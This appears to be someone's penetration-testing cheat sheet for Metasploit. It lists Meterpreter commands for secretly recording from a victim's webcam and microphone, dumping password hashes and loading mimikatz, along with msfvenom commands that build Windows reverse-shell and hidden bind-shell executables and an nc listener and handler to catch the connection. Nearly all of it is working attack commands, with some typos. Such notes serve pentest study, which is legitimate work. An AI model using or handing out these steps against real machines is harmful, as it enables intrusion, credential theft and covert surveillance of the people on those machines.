			Meterpreter
### Webcam
- `record_mic`     Record audio from the default microphone for X seconds
- `webcam_chat`    Start a video chat
- `webcam_list`    List webcams
- `webcam_snap`    Take a snapshot from the specified webcam
- `webcam_stream`  Play a video stream from the specified webcam

### Misc

- `hashdump` will retrieve all hashed frm sam file
- `load kiwi` will in let us use mimikatz
- `screenshot` Grab a screenshot of the interactive desktop
- `shell`  get a shell on remote machine

# MSFvenoim
WINDOWS reverse shell
- get ip `ip a`
- `msfvenom -p windows/shell_reverse_tcp lhost=$IP lport=443 -f exe > shell.exe`
- `nc -lvnp 443`

msfvenom -p windows/shell_hidden_bind_tcp ahost=192.168.1.224 lport=443 -f exe > bind.exe    

# Getting a meterpreter shell
- `use exploit/multi/handler`
- `set payload`
- `lport 443`
- `exploit`


https://www.hackingarticles.in/msfvenom-cheatsheet-windows-exploitation/